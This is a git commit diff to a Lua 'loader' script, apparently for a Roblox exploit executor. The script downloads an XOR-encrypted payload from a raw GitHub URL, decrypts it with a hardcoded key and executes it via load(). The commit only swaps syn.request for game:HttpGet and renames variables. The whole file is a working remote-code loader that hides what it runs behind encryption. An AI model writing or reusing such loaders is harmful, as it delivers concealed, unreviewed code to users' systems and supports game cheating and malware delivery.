6bf5c35ad86f9b64b162d07eb45ad443cc340587
janhub1 <janmiskovsky0@gmail.com>
2026-03-04 15:09:25 +0100

    loader

--- loader.lua
+++ loader.lua
@@ -3,7 +3,7 @@ local key = "aVysHSYBTqIuFaQW"
 local function decrypt(data, key)
     local res = {}
     for i = 1, #data do
-        local k = key:byte((i-1) % #key + 1)
+        local k = key:byte((i - 1) % #key + 1)
         local c = data:byte(i)
         res[i] = string.char(bit32.band(bit32.bxor(c, k), 0xFF))
     end
@@ -12,17 +12,14 @@ end
 
 local url = "https://raw.githubusercontent.com/janhub1/scriptsurvivelava1/main/payload.xor"
 
-local success, response = pcall(function()
-    return syn.request({
-        Url = url,
-        Method = "GET"
-    }).Body
+local success, encrypted = pcall(function()
+    return game:HttpGet(url, true)
 end)
 
 if not success then
-    warn("syn.request selhalo: " .. tostring(response))
+    warn("Stahování selhalo: " .. tostring(encrypted))
     return
 end
 
-local decoded = decrypt(response, key)
+local decoded = decrypt(encrypted, key)
 load(decoded)()
